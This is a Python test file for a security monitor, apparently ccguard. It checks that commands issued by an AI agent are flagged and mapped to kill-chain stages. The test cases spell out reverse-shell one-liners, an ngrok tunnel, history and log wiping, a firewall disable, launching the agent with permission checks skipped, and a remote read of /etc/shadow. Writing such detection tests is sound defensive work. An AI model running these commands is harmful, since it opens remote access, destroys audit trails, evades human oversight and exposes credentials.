"""P2: the 3 structurally-dead kill-chain stages now resolve.

defense-evasion / command-and-control / lateral-movement had no catalog signal
and no prefix mapping, so any chain step on them was dead. Adding signals +
prefix entries revives them with zero chain_engine change.
"""
from __future__ import annotations

import pytest

from ccguard.agent.signals.extractor import extract_signals
from ccguard.server.services.chain_constants import stage_for_signal

CASES = [
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "c2.reverse_shell", "command-and-control"),
    ("nc -e /bin/sh 10.0.0.1 4444", "c2.reverse_shell", "command-and-control"),
    ("ngrok http 8080", "c2.tunnel", "command-and-control"),
    ("history -c", "defense.clear_history", "defense-evasion"),
    ("rm -f ~/.bash_history", "defense.clear_history", "defense-evasion"),
    ("journalctl --vacuum-time=1s", "defense.clear_logs", "defense-evasion"),
    ("ufw disable", "defense.disable_security", "defense-evasion"),
    ("claude --dangerously-skip-permissions", "defense.disable_security", "defense-evasion"),
    ("ssh deploy@10.0.0.5 'cat /etc/shadow'", "lateral.remote_exec", "lateral-movement"),
]


@pytest.mark.parametrize("cmd,sig,stage", CASES)
def test_signal_fires_and_maps_to_stage(cmd, sig, stage):
    assert sig in set(extract_signals("Bash", {"command": cmd})), cmd
    assert stage_for_signal(sig) == stage


def test_benign_commands_not_flagged():
    # ssh-keygen is not a remote-exec; git log is not a log-clear
    assert "lateral.remote_exec" not in set(
        extract_signals("Bash", {"command": "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519"})
    )
    assert "defense.clear_logs" not in set(
        extract_signals("Bash", {"command": "git log --oneline -5"})
    )
